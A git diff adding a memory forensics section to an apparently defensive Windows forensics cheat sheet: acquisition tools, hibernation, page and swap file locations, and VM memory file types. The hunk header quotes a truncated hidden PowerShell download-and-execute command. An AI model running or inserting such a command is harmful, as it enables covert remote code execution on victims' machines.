@@ -1800,6 +1800,101 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 
 <br>
 
+# Memory Forensics
+
+**Capabilities**
+- Archival of commandline data per process
+- Recording of host-based netowrk activity, including local DNS cache, sockets, ARP, etc
+- Tracking of new process handles and execution tracing
+- Analyzing suspicious thread creation and memory allocation
+- Identification of common DLL injection and hooking (rootkit) tehcniques
+
+<br>
+
+## Acquiring Memory
+
+### Live System
+- [WinPMEM](https://github.com/Velocidex/c-aff4)
+- DumpIt
+- F-Response and SANS SIFT
+- [Belkasoft Live RAM Capturer](https://belkasoft.com/ram-capturer)
+- [MagnetForensics Ram Capture](https://www.magnetforensics.com/resources/magnet-ram-capture/)
+
+<br>
+
+### Dead System
+
+**Hibernation File**
+- Contains a compressed RAM Image
+- When PC goes into power save or hibernation mode from sleep mode
+- ```%SystemDrive%\hiberfil.sys```
+
+<br>
+
+**Page and Swap Files**
+- ```%SystemDrive%\pagefile.sys```  
+- Parts of memory that were paged out to disk
+- ```%SystemDrive%\swapfile.sys``` (Win8+\2012+)
+- The working set of memory for suspended Modern apps that have been swapped to disk
+
+<br>
+
+**Memory Dump**
+- ```%WINDIR%\MEMORY.DMP```
+- Crash dump
+
+### Hiberfil.sys
+**Tools can decompress to raw**
+- Volatility *imagecopy*
+- Comae *hibr2bin.exe*
+- Arsenal *Hibernation Recon*
+
+**Tools that can analyze natively**
+- BulkExtractor
+- Magnet AXIOM
+- Volatility
+- Passware
+
+### Virtual Machine Machines
+
+**VMware**
+- .vmem = raw memory 
+- .vmss and .vmsn = memory image
+- Suspend or Snapshot VM
+
+<br>
+
+**Microsoft Hyper-V**
+- .bin = memory image
+- .vsv = save state
+
+<br>
+
+**Parallels**
+- .mem = raw memory image
+
+<br>
+
+**VirtualBox**
+- .sav = partial memory image
+
+<br>
+
+## Memory Analysis
+
+
+
+
+
+
+
+
+<br>
+
+---
+
+<br>
+
 # Windows Forensics
 
 ## SANS Windows Forensic Analysis Poster
